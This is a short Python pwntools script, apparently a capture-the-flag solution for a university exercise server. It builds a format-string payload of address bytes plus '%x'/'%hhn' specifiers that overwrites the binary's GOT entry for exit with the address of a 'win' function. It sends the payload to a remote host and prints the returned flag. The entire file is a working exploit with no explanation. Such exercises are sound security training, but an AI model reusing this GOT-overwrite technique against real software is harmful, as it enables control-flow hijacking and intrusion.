#!/usr/bin/env python
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 10097

context.arch = "i386"
context.os = "linux"

e = ELF("bin")
GOT = e.got["exit"]
WIN = e.symbols["win"]

PTR = [p32(GOT + i) for i in range(4)]
POS = [(7 + i) for i in range(4)]
PADD = [((WIN >> (8 * i)) & 0xFF) for i in range(4)]

DATA = ""
for p in PTR:
    DATA += p

PADD[3] += 256 - PADD[2]
PADD[2] += 256 - PADD[1]
PADD[1] += 256 - PADD[0]
PADD[0] += 256 - len(DATA)

for p in zip(PADD, POS):
    DATA += "%{}x".format(p[0]) + "%{}$hhn".format(p[1])

s = remote(SERVER, PORT)
s.sendline(DATA)
print(s.recvuntil("}"))
s.close()
